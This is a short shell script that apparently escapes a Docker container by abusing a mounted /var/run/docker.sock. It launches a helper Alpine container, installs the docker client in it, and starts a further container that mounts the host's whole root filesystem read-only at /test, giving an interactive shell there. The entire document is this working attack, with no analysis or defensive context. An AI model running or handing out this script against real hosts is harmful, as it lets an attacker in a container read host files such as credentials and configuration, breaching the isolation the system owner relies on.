mkdir /dockersock
cd /dockersock

if [ -e "/var/run/docker.sock" ]; then
  cont_id=$(docker run -itd --name=temp_cont -v /var/run/docker.sock:/var/run/docker.sock alpine)

  touch second_cont.sh

  echo echo 1 > second_cont.sh
  echo apk update >> second_cont.sh
  echo apk add -U docker >> second_cont.sh
  echo "echo \#---------------------------------------" >> second_cont.sh
  echo echo Creating container with mounted host filesystem is done >> second_cont.sh
  echo echo Check /test >> second_cont.sh
  echo echo You can close container using Ctrl+D when you want >> second_cont.sh
  echo docker -H unix:///var/run/docker.sock run -it -v /:/test:ro -t alpine sh >> second_cont.sh
  echo echo You need to close the second container too >> second_cont.sh

  chmod +x second_cont.sh
  docker cp second_cont.sh $cont_id:/
  echo \#---------------------------------------
  echo Print ./second_cont.sh
  docker exec -it $cont_id sh

  echo ---------------------------------------
  echo Wait while containers are removing
  rm second_cont.sh
  docker stop $cont_id 1>/dev/null
  docker rm temp_cont 1>/dev/null
  echo Mounted and temporary contaners were deleted

else
 echo "Socket isn't mounted in this container"
fi
